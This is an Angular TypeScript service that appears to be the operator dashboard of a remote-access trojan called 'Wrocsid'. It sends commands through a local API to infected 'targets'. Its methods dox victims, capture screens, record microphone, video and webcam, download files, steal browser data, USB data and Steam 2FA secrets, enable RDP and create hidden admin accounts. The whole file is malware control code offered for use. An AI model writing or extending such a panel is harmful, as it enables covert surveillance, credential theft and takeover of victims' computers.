import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';

@Injectable({
  providedIn: 'root'
})
export class WrocsidService {
  private api_base

  constructor(private http: HttpClient) {
    this.api_base = "http://localhost:8000/api"
  }

  get_targets_data() {
    let url = this.api_base.concat("/targets")
    return this.http.get(url)
  }

  dox(identifier: string) {
    let url = this.api_base.concat("/dox/").concat(identifier)
    this.http.get(url).subscribe()
  }

  mouse(identifier: string, freeze_time: string) {
    let url = this.api_base.concat("/mouse/").concat(identifier).concat("/").concat(freeze_time)
    this.http.get(url).subscribe()
  }

  screen(identifier: string) {
    let url = this.api_base.concat("/screen/").concat(identifier)
    this.http.get(url).subscribe()
  }

  download(identifier: string, path: string) {
    let url = this.api_base.concat("/download/").concat(identifier).concat("/").concat(path)
    this.http.get(url).subscribe()
  }

  record(identifier: string, record_time: string) {
    let url = this.api_base.concat("/record/").concat(identifier).concat("/").concat(record_time)
    this.http.get(url).subscribe()
  }

  getSteam2fa(identifier: string) {
    let url = this.api_base.concat("/getSteam2fa/").concat(identifier)
    this.http.get(url).subscribe()
  }

  getTargetResults(identifier: string) {
    let url = this.api_base.concat("/results/").concat(identifier)
    return this.http.get(url)
  }

  videoRecord(identifier: string, record_time: string) {
    let url = this.api_base.concat("/videorecord/").concat(identifier).concat("/").concat(record_time)
    return this.http.get(url).subscribe()
  }

  getTargetPings(identifier: string) {
    let url = this.api_base.concat("/pings/").concat(identifier)
    return this.http.get(url)
  }

  getBrowserData(identifier: string) {
    let url = this.api_base.concat("/browserdata/").concat(identifier)
    this.http.get(url).subscribe()
  }

  getUSBData(identifier: string) {
    let url = this.api_base.concat("/usbdata/").concat(identifier)
    this.http.get(url).subscribe()
  }

  rdpEnable(identifier: string) {
    let url = this.api_base.concat("/rdpenable/").concat(identifier)
    this.http.get(url).subscribe()
  }

  createAdminUser(identifier: string) {
    let url = this.api_base.concat("/createadminuser/").concat(identifier)
    this.http.get(url).subscribe()
  }

  cameraRecord(identifier: string, record_time: string) {
    let url = this.api_base.concat("/camerarecord/").concat(identifier).concat("/").concat(record_time)
    return this.http.get(url).subscribe()
  }
}
